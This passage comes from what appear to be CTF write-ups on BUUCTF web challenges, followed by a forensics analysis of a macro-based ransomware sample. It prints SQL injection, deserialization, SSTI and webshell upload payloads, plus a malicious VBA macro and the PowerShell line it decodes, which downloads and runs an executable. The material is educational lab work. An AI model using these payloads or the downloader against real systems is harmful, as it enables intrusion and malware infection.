uniunionon seleselectct 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whewherere table_schema=database() #\r1\u0026#39; uniunionon seleselectct 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whewherere table_name=\u0026#34;b4bsql\u0026#34; #\r1\u0026#39; uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom `b4bsql` #\rHello cl4y,sql,porn,git,Stop,badguy,hacker,flag！\rYour password is \u0026#39;i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{f1861fb5-9f3b-46b0-8b23-b198fa61af3e}\u0026#39; [极客大挑战 2019]PHP 下载备份文件www.zip，class.php中有反序列化，绕过wakeup方法即可：\n?select=O%3A4%3A\u0026#34;Name\u0026#34;%3A3%3A{s%3A14%3A\u0026#34;%00Name%00username\u0026#34;%3Bs%3A5%3A\u0026#34;admin\u0026#34;%3Bs%3A14%3A\u0026#34;%00Name%00password\u0026#34;%3Bi%3A100%3B} flag{af79b7f8-ff57-4346-b945-207910c0808b}\n[ACTF2020 新生赛]BackupFile 扫一下目录，扫出index.php.bak，弱比较，key传123即可\nflag{1032bda2-5d01-4701-86f7-db6ba9d16d69}\ncalc.php：\n\u0026lt;?php error_reporting(0); if(!isset($_GET[\u0026#39;num\u0026#39;])){ show_source(__FILE__); }else{ $str = $_GET[\u0026#39;num\u0026#39;]; $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;,\u0026#39;\\$\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $str)) { die(\u0026#34;what are you want to do?\u0026#34;); } } eval(\u0026#39;echo \u0026#39;.$str.\u0026#39;;\u0026#39;); } ?\u0026gt; 执行需要参数的命令的符号基本都被ban了，考虑无参rce，但是发现传入非数字就会forbbiden，猜测是waf\n可以通过php解析特性来绕过该waf，由于waf只针对num，而php可以将%20num等同样解析为变量num，参考文章\n方法一：session_start()\n?%20num=1;eval(hex2bin(session_id(session_start()))) Cookie: PHPSESSID=73797374656d2827696427293b 发现不能执行system命令，查了disable_functions，许多系统命令都被ban了：\n考虑使用scandir()直接获取根目录文件名：\n再用readfile读取/f1agg即可：flag{1b105168-e27d-4256-b85b-ee49c80f6127}\n方法二：get_defined_vars()\n获取根目录下文件名：\n?%20num=1;eval(end(current(get_defined_vars())));\u0026amp;cmd=var_dump(scandir(\u0026#39;/\u0026#39;)); 读取文件：\n? num=1;eval(end(current(get_defined_vars())));\u0026amp;cmd=readfile(\u0026#34;/f1agg\u0026#34;); [极客大挑战 2019]BuyFlag pay.php网页源码注释：\n\u0026lt;!-- ~~~post money and password~~~ if (isset($_POST[\u0026#39;password\u0026#39;])) { $password = $_POST[\u0026#39;password\u0026#39;]; if (is_numeric($password)) { echo \u0026#34;password can\u0026#39;t be number\u0026lt;/br\u0026gt;\u0026#34;; }elseif ($password == 404) { echo \u0026#34;Password Right!\u0026lt;/br\u0026gt;\u0026#34;; } } --\u0026gt; 弱类型比较，科学计数法：\n[HCTF 2018]admin 注册了一个账号，修改密码页面有注释：\n\u0026lt;!-- https://github.com/woadsl1234/hctf_flask/ --\u0026gt; 已经无法访问了，从其他师傅wp那里大概知道这题是考flask session伪造，源码里包含了secret key：ckj123\nflask-session-cookie-manager\u0026gt;python flask_session_cookie_manager3.py decode -c \u0026#34;.eJw9kMGKgzAURX9leOsuNDqbQhcFo7TDiwRiQ7IpMzbVqumAWhpT-u8TOtD1hXvPuQ84nkcztbCex5tZwfFygvUDPn5gDarLWyWUUyIfdDb0zFceZd6rrk6VqFJW0KgsDi0TKi4lpihYq3wdMYsLK7jDgjqW8TtKvmBWJyyjnyh4rGU-YNc4LWmEnnokB4sFLspiUgpKWNZH2IVdwlMtalLKwNFhrGxFmOBOd7tU-b1lni_aBibfbOC5gnoaz8f5tzfXt4KWKmBtU213AaWKlT9dGKlcKVhQ4klQiXTWJ-jzVmdNQKCu3G5edRf73Zh3kxn2X-L-n1y_bQhgNtMckwRWcJvM-HoO4gief-6_bUg.aHdOEw.PpWIfOw5jpT3vcj8KowQEhsohU8\u0026#34; -s \u0026#34;ckj123\u0026#34; {\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: b\u0026#39;b1aa61a1ed9d7531adb78a584a48ea5659c813ac746c24d10a14401d2077419145eae281ea43133ef0c2bc7916494261cd8e769aab35be6541f28c2f742fe338\u0026#39;, \u0026#39;csrf_token\u0026#39;: b\u0026#39;ef8108fb1455c7b7e193ed47b74d9731ad82ba18\u0026#39;, \u0026#39;image\u0026#39;: b\u0026#39;zRJO\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;test123\u0026#39;, \u0026#39;user_id\u0026#39;: \u0026#39;10\u0026#39;} 进行伪造：\nflask-session-cookie-manager\u0026gt;python flask_session_cookie_manager3.py encode -s \u0026#34;ckj123\u0026#34; -t \u0026#34;{\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: b\u0026#39;b1aa61a1ed9d7531adb78a584a48ea5659c813ac746c24d10a14401d2077419145eae281ea43133ef0c2bc7916494261cd8e769aab35be6541f28c2f742fe338\u0026#39;, \u0026#39;csrf_token\u0026#39;: b\u0026#39;ef8108fb1455c7b7e193ed47b74d9731ad82ba18\u0026#39;, \u0026#39;image\u0026#39;: b\u0026#39;zRJO\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;user_id\u0026#39;: \u0026#39;10\u0026#39;}\u0026#34; .eJw9kM2KwjAYRV9l-NYu-jcbwYWQtOjwpQRSQ7IRrbW_6UCrmEZ89wkOuL5w7zn3CcfrVM0NrG_TvVrBsb3A-glfZ1iD6tJGCWWVSAdNhp65wqFMe9WViRJFwjIa5NmhYUKFucQEBWuUKwNmcGEZt5hRywh_oOQLkjJmhH6j4KGW6YBdbbWkATrqMDoYzHBRBuNc0IiRPsDO70Y80aKMcuk5OgyVKSImuNXdLlFub5jjizaeydUbeK2gnKfr8fbbV-NHQUvlsbaJNjuPUoTKXVoWFTYXzCvx2KsEmvQxurTRpPYI1ObbzbuuNae6-jRVw_5HPP6T8WR8AKeLaUdYwX2upvdvEAbw-gMYqWz7.aHdQJg.qOQUFjkSIcK-N5yQTFZB71QV_3w 带着Cookie访问即可获得flag：flag{db63520d-2657-42dd-9714-86af4e544761}\n[BJDCTF2020]Easy MD5 抓包，相应包有hint：\nhint: select * from \u0026#39;admin\u0026#39; where password=md5($pass,true) 当password为ffifdyop时，生成的md5对应字节'or'6É]é!r,ùíb，对应万能密码\nlevels91.php，数组绕过：\n\u0026lt;!--\r$a = $GET[\u0026#39;a\u0026#39;];\r$b = $_GET[\u0026#39;b\u0026#39;];\rif($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){\r// wow, glzjin wants a girl friend.\r--\u0026gt; levell14.php，强比较，依然可以数组绕过：\n\u0026lt;?php\rerror_reporting(0);\rinclude \u0026#34;flag.php\u0026#34;;\rhighlight_file(__FILE__);\rif($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){\recho $flag;\r} flag{da0914dd-06b9-4037-8de6-8ee4bbee3bc0}\n[MRCTF2020]你传你🐎呢 能解析的php文件后缀都被过滤了，也有对content-type的检测，但是没有对上传文件内容进行检测，考虑上传.htaccess来使当前目录下的jpg解析为php：\nContent-Disposition: form-data; name=\u0026#34;uploaded\u0026#34;; filename=\u0026#34;.htaccess\u0026#34;\rContent-Type: image/jpeg\r\u0026lt;IfModule mime_module\u0026gt;\rAddHandler php5-script .jpg\r\u0026lt;/IfModule\u0026gt; 再上传.jpg后缀的一句话木马即可拿shell，好像不能执行system命令，直接连蚁剑：\nflag{69395339-10e2-4e7f-abb6-dc94aa0599b3}\n[护网杯 2018]easy_tornado 获取文件的方式是filename+filehash，如获取flag.txt：\nfile?filename=/flag.txt\u0026amp;filehash=34f85d5ac5453cca27b9e169661f78f0 flag.txt：\nflag in /fllllllllllllag hints.txt中给出了哈希计算方式：\nmd5(cookie_secret+md5(filename)) 先随便传个filename，跳转到了error路由下，结合welcome.txt中所说的render，应该是SSTI来获取cookie_secret\n官方文档有cookie_secret的相关资料，github上tornado的源码中也有关于cookie_secret的资料：\nclass RequestHandler:\r...\r@property\rdef settings(self) -\u0026gt; Dict[str, Any]:\r\u0026#34;\u0026#34;\u0026#34;An alias for `self.application.settings \u0026lt;Application.settings\u0026gt;`.\u0026#34;\u0026#34;\u0026#34;\rreturn self.application.settings\r...\rself.require_setting(\u0026#34;cookie_secret\u0026#34;, \u0026#34;secure cookies\u0026#34;)\rsecret = self.application.settings[\u0026#34;cookie_secret\u0026#34;] settings是self.application.settings的别名，上网搜索后发现handler对应当前的RequestHandler对象，尝试传入?msg={{handler.settings}}：\n{\u0026#39;autoreload\u0026#39;: True, \u0026#39;compiled_template_cache\u0026#39;: False, \u0026#39;cookie_secret\u0026#39;: \u0026#39;fd02ee5f-2cf0-43a6-a443-68425cd6a1eb\u0026#39;} 计算flag文件filehash即可：\nfile?filename=/fllllllllllllag\u0026amp;filehash=af5f2ddcd41b3c976e0f039d8ee99bf6 flag{80eb5834-b9f0-46a0-ac82-3eb81f6883a6}\n[ZJCTF 2019]NiZhuanSiWei data协议传入text，先用伪协议读取useless.php：\n?text=data:,welcome to the zjctf\u0026amp;file=php://filter/read=convert.base64-encode/resource=useless.php useless.php：\n\u0026lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\rreturn (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;);\r} } } ?\u0026gt; 有个tostring的魔术方法，反序列化时当一个对象被当作一个字符串时使用，index.php里有echo，必定会触发该方法：\n?text=data:,welcome to the zjctf\u0026amp;file=useless.php\u0026amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D 网页源码：\n\u0026lt;br\u0026gt;oh u find it \u0026lt;/br\u0026gt;\r\u0026lt;!--but i cant give it to u now--\u0026gt;\r\u0026lt;?php\rif(2===3){ return (\u0026#34;flag{09942828-3ac1-4ba0-ab1a-84c6e5784ac3}\u0026#34;);\r}\r?\u0026gt; [MRCTF2020]Ez_bypass 整理一下页面的代码：\nI put something in F12 for you include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } }Please input first ?id[]=1\u0026amp;gg[]=2\rpasswd=1234567a flag.php：\n\u0026lt;?php\r$flag=\u0026#34;flag{dd110346-bea7-4cc0-b2ad-0347ae572a4f}\u0026#34;\r?\u0026gt; [极客大挑战 2019]HardSQL 单引号闭合，fuzz了一下，过滤了空格,and,union,substr等，用括号来绕过空格过滤，尝试报错注入：\n1\u0026#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))# XPATH syntax error: \u0026#39;~geek~\u0026#39; 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# XPATH syntax error: \u0026#39;~H4rDsq1~\u0026#39; 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\u0026#34;H4rDsq1\u0026#34;)),0x7e),1))# XPATH syntax error: \u0026#39;~id,username,password~\u0026#39; 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(`H4rDsq1`)),0x7e),1))# XPATH syntax error: \u0026#39;~flag{0db504ac-df00-4099-8bf4-b4\u0026#39; 1\u0026#39;or(updatexml(1,(concat(0x7e,right((select(group_concat(password))from(`H4rDsq1`)),30),0x7e)),1))# XPATH syntax error: \u0026#39;~c-df00-4099-8bf4-b42864fa1e80}~\u0026#39; [网鼎杯 2020 青龙组]AreUSerialz 只需要传入int型的2即可绕过强比较，从而读取flag.php：\n\u0026lt;?php class FileHandler { protected $op = 2; protected $filename = \u0026#34;flag.php\u0026#34;; protected $content = \u0026#34;test\u0026#34;; } print(urlencode(serialize(new FileHandler()))); ?\u0026gt; O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3Bs%3A4%3A%22test%22%3B%7D 但是由于是protected，会生成%00导致无法通过is_valid，不知道如何绕过，看了其他师傅的wp，特定版本的php对访问修饰符不敏感：PHP版本7.1+，对属性的类型不敏感。本题php版本7.4.3，也就是说可以在构造序列化字符串时将成员全部设为public，最终payload：\nO%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A4%3A%22test%22%3B%7D flag{7c768194-7c00-4622-ae29-be5fc9a232ac}\n[GXYCTF2019]BabyUpload 过滤ph后缀，先上传.htaccess，再上传shell.jpg即可，注意将一句话木马改为script标签：\nContent-Disposition: form-data; name=\u0026#34;uploaded\u0026#34;; filename=\u0026#34;shell.jpg\u0026#34;\rContent-Type: image/jpeg\r\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;@eval($_POST[\u0026#34;shell\u0026#34;]);\u0026lt;/script\u0026gt; flag{7a45bf74-6807-4299-9622-3604e7877b20}\n[SUCTF 2019]CheckIn .htaccess和php后缀全被过滤，还有对于图片头的检测，考虑上传.user.ini：\nGIF89a\rcgi.fix_pathinfo = 1\rengine = on\rauto_prepend_file=shell.jpg\rauto_append_file=shell.jpg 在.user.ini同一目录下的任意php文件被解析时，都会在开头和结尾包含shell.jpg文件，蚁剑连接即可\nflag{bee6042e-5315-4127-a851-a4f06a8dd254}\n[GYCTF2020]Blacklist 和强网杯的随便注感觉没区别，用handler代替select：\n1\u0026#39;;handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` close # flag{6495833f-bb80-4b8b-858e-e7d99e474b89}\n[RoarCTF 2019]Easy Java 第一道java题。点击help跳转到Download路由下，有一个任意文件读取，简单了解了一下java web项目的结构：\n/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则\r/WEB-INF/classes/：包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\r/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件\r/WEB-INF/src/：源码目录，按照包名结构放置各个 Java 文件\r/WEB-INF/database.properties：数据库配置文件\r/WEB-INF/tags/：存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名\r/WEB-INF/jsp/：jsp 文件的存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 考虑读取web.xml文件，将请求方式改为POST：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;Index\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.IndexController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Index\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.LoginController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Login\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.DownloadController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Download\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.FlagController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Flag\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 直接访问/Flag路由会报错，直接读取/WEB-INF/classes/com.wm.ctf.FlagController.class文件，反编译：\npackage defpackage; import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @WebServlet(name = \u0026#34;FlagController\u0026#34;) /* renamed from: FlagController reason: default package */ /* loaded from: _WEB-INF_classes_com_wm_ctf_FlagController.class */ public class FlagController extends HttpServlet { String flag = \u0026#34;ZmxhZ3swN2MxZTVjNC1kNDI1LTQ0ODUtYTc5Ny0yYWNmMjVhODE0OGV9Cg==\u0026#34;; protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException { httpServletResponse.getWriter().print(\u0026#34;\u0026lt;h1\u0026gt;Flag is nearby ~ Come on! ! !\u0026lt;/h1\u0026gt;\u0026#34;); } } base64解码得到flag：flag{07c1e5c4-d425-4485-a797-2acf25a8148e}\n","permalink":"https://blog.w8nn9z.top/posts/ctf/buuojpage1/","summary":"","title":"BUUCTF WEB page1"},{"content":"Party Time 桌面上有个 Party invitation.docm ，dump下来一眼宏病毒，oletools可以查看宏的代码：\nPrivate Sub Document_Open() Dim p As DocumentProperty Dim decoded As String Dim byteArray() As Byte For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = \u0026#34;Comments\u0026#34; Then byteArray = test(p.Value) decoded = \u0026#34;\u0026#34; For i = LBound(byteArray) To UBound(byteArray) decoded = decoded \u0026amp; Chr(byteArray(i) Xor \u0026amp;H64) Next i Shell (decoded) End If Next End Sub Function test(hexString As String) As Byte() Dim lenHex As Integer lenHex = Len(hexString) Dim byteArray() As Byte ReDim byteArray((lenHex \\ 2) - 1) Dim i As Integer Dim byteValue As Integer For i = 0 To lenHex - 1 Step 2 byteValue = Val(\u0026#34;\u0026amp;H\u0026#34; \u0026amp; Mid(hexString, i + 1, 2)) byteArray(i \\ 2) = byteValue Next i test = byteArray End Function 分析一下可以知道是从 Comments 属性中获取字符串，与0x64异或后执行得到的shell代码，问了gpt，说是在 core.xml 里能找到 hexstring 内容：\n140b130116170c0108084a011c01444913440c0d0000010a444c0a0113490b060e01071044371d171001094a2a01104a33010627080d010a104d4a200b130a080b0500220d08014c430c1010145e4b4b555d564a55525c4a5654534a555e5c545c544b130d0a000b13173b1114000510013b56545650545c55574a011c01434840010a125e100109144f434b130d0a000b13173b1114000510013b56545650545c55574a011c01434d5f37100516104934160b070117174440010a125e10010914434b130d0a000b13173b1114000510013b56545650545c55574a011c0143 s = \u0026#34;140b130116170c0108084a011c01444913440c0d0000010a444c0a0113490b060e01071044371d171001094a2a01104a33010627080d010a104d4a200b130a080b0500220d08014c430c1010145e4b4b555d564a55525c4a5654534a555e5c545c544b130d0a000b13173b1114000510013b56545650545c55574a011c01434840010a125e100109144f434b130d0a000b13173b1114000510013b56545650545c55574a011c01434d5f37100516104934160b070117174440010a125e10010914434b130d0a000b13173b1114000510013b56545650545c55574a011c0143\u0026#34; shell = \u0026#34;\u0026#34; for i in range(0,len(s),2): shell += chr(int(s[i:i+2],base=16) ^ 0x64) print (shell) 运行结果为powershell恶意脚本，会下载恶意程序放到 $env:temp 目录下并执行：\npowershell.exe -w hidden (new-object System.Net.WebClient).DownloadFile(\u0026#39;http://192.168.207.1:8080/windows_update_20240813.exe\u0026#39;,$env:temp+\u0026#39;/windows_update_20240813.exe\u0026#39;);Start-Process $env:temp\u0026#39;/windows_update_20240813.exe\u0026#39; 用FTK Imager挂载ad1文件，在Temp目录下找到 windows_update_20240813.exe ，放到云沙箱里说是有释放文件，在桌面上可以找到 readme.txt 和 flag.rar ，先看看 readme.txt 文件内容：\nHi, since you are reading this it means you have been hacked. In addition to encrypting your files, deleting backups, we also downloaded confidential information. Here\u0026#39;s what you shouldn\u0026#39;t do: 1) Contact the police, fbi or other authorities before the end of our deal 2) Contact the recovery company so that they would conduct dialogues with us. (This can slow down the recovery, and generally put our communication to naught) 3) Do not try to decrypt the files yourself!!! This can lead to the impossibility of their decryption. 4) Keep us for fools) We will also stop any communication with you, and continue DDoS, calls to employees and business partners. In a few weeks, we will simply repeat our attack and delete all your data from your networks, WHICH WILL LEAD TO THEIR UNAVAILABILITY! Here\u0026#39;s what you should do right after reading it: 1) If you are an ordinary employee, send our message to the CEO of the company, as well as to the IT department 2) If you are a CEO, or a specialist in the IT department, or another person who has weight in the company, you should contact us within 24 hours by email. We are ready to confirm all our intentions regarding DDOS, calls, and deletion of the date at your first request. Mails to contact us: weary_meadow@163.com flag.rar 就是勒索软件加密的文件，考虑逆向获取加密逻辑：\n可以看到在注册表里存放了RSA的密钥，具体看看函数的话可以知道公私钥都在注册表里，并且还有一个Devicekey，值为hostname的sha256值，最终实现了一个RSA-OAEP Encrypt的操作：\n赛后重新搞了一下python环境的volatility2，发现可以跑出profile来，先查注册表里的key：\n$ python2 vol.py -f 1.raw --profile=Win10x64_19041 printkey -K \u0026#34;SOFTWARE\\nothing\u0026#34; 只需提出privatekey用于解密：\n-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA0WudoQ2mgYalJ2LKLzxeqVydTdteAQkdllvhu/jh7+pCTvUJ uNMJEdSFphVAIp53BBuGVp0xwSav8hbffHX+Fdn7ZRN0YecgDtPA3Pd3y9jcutVZ yes8Wjbpt6qTD+ITl1nPsKqsB2Ry1BhFYWBC8+2YniKQqb4UE3Kr7LE78Tb8ABp9 epe4AMguNHlgdC97DpJ5R7/esRjMey/NWdFXN1LsQYCn9/UGwVhLG3gmPn200XE6 KLjXRijrN23lwpDw88J7pfJCbfh/jgpoe91Rmq/ADs4mwhXcNRafmsNixCj/Zwcr 3ANPuTNOKmH6IaPWg410O+1q2noV67cLi/NrIQIDAQABAoIBAQCuljT3S1YArauJ xkYgUwfn0Zoiijs4Sc0syLTL7JUPWhClmorcVrM89hvlddneApXeCsRX+Py9te8A uCjgrc2BkhSPE0T3SaPkOIyUqopomwaJi8wrFb1eyGDYCZBIsYT7rJgFBIQeNZO1 VfahU4r9qJqPWumXWSuLexHxZWA/msByzrijZIP5ufeuIzCNLV6yOPOhSMIHCA3s hOjOQsW76q+fVIGAR8qHFj/Ee02ta4engXEhBWa5Y7pLqtihHdZIcn0KRxx3+Ev5 kJhBMIPazdneQ/KiP5wzkdSYoTf9+hLjYGQu6A3T2GqzrOvlsd6gNfq/WlrKzIa6 P7wqXhhBAoGBANmHWpnPUZvR0LXLMi8n+zE7FWhtVI5eZltpVou1XefYt6/LZLv9 /pSQCZRRwqUQTjFWOKcg+H2rRdKVc7h/fySXDlmUkE9Ep4REqAAMEGRQKRUJrq2D KiNq7E08dZpoAiaH4PaZKMsuubxpJX3WSTkLVXnusN0TObCibjnKk2mdAoGBAPZ1 J6roXjv6f4N3+i/aUUh/UaGlJuhqyi8ALiI7+9dIVrKyU8ULjjnlb3F8Mg4n8FQb AxTAnN9HvDBYLwwWo48yD7zzNPlxwF3rEiUuZ8BjUGMuN1QIPT0wSDvKjOdOoQFB HkNu/Ysjfp4paET0foYRzu62eAzh9mAegM9PHKJVAoGASudf3EzWViiGjML+cdx7 k7U7puzWy/tXlayNH6iBQH+QqNkJw+4vRqrekZMhykL2GekNswcYafWbImtSILrO ZiQZzeDpXFJQuKwHiZSd5Fzx+IuP+bGLxgxgeCwUdunPq8LoRSHyORzK2kT+ovkx 15G+ijEV99pR6C/WctH9tsUCgYAVlP7LRZvy7qW58oizJhAWJCgW2qqEkc1wvjhM ASq1mH0XGuyhBbkHsuLGclTDzpWKF+92IsPZ/aMqLJ66FUVvZbfhGP8blO1+i/ZD 0UN+onPIq6RmtG4AbLj2m28pVkZdIMGwsAh95bbRzNh3qV1nCiov10S+BA+aLTGk dc4RHQKBgBPT6/JmHGe6MqbEfnu7H0FyubseQ5B5bsWrw9xX0gVwjDV6iiTnqLT0 lD5qVyb4nGAcaqn7Wm3Hoykom6x7CnueBHY7HHGq21bvTOQv/aC59mZxpPaDEMUR eROsDq1jsfYVTBwpUDoWP7yRAv5tiUHU0BtjwlozyfvgJOIpjTMg -----END RSA PRIVATE KEY----- 再可以从环境变量里找到hostname，结果里很多都有主机名：\n$ python2 vol.py -f 1.raw --profile=Win10x64_19041 envars ... 6488 conhost.exe 0x00000239b11d0fe0 USERDOMAIN DESKTOP-8KRF7H0 6488 conhost.exe 0x00000239b11d0fe0 USERDOMAIN_ROAMINGPROFILE DESKTOP-8KRF7H0 ... 原勒索软件是Go语言编写的，python的RSA-OAEP好像解不出原文件：\npackage main import ( \u0026#34;crypto/rand\u0026#34; \u0026#34;crypto/rsa\u0026#34; \u0026#34;crypto/sha256\u0026#34; \u0026#34;crypto/x509\u0026#34; \u0026#34;encoding/pem\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; ) var hostname = \u0026#34;DESKTOP-8KRF7H0\u0026#34; func main() { //read and parse key privateKeyFile, err := ioutil.ReadFile(\u0026#34;RSAprivatekey.pem\u0026#34;) if err != nil { log.Fatalf(\u0026#34;Read RSAprivatekey file Error: %v\u0026#34;, err) } block, _ := pem.Decode(privateKeyFile) if block == nil || block.Type != \u0026#34;RSA PRIVATE KEY\u0026#34; { log.Fatalf(\u0026#34;Decode RSAprivatekey file Error:%v\u0026#34;, err) } RSAprivateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes) if err != nil { log.Fatalf(\u0026#34;Parse RSAprivatekey file Error: %v\u0026#34;, err) } encryptedFile, err := ioutil.ReadFile(\u0026#34;flag.rar\u0026#34;) if err != nil { log.Fatalf(\u0026#34;Read encrypted file Error: %v\u0026#34;, err) } //RSA OAEP and SHA-256 devicekey := sha256.Sum256([]byte(hostname)) label := devicekey[:] hash := sha256.New() decryptedFile, err := rsa.DecryptOAEP(hash, rand.Reader, RSAprivateKey, encryptedFile, label) if err != nil { log.Fatalf(\u0026#34;RSADecryptOAEP Error: %v\u0026#34;, err) } err = ioutil.WriteFile(\u0026#34;output.rar\u0026#34;, decryptedFile, 0666) if err != nil { log.Fatalf(\u0026#34;Write decrypted file Error: %v\u0026#34;, err) } fmt.Println(\u0026#34;Decrypt encrypted file successfully\u0026#34;) } 最后得到的 out.rar 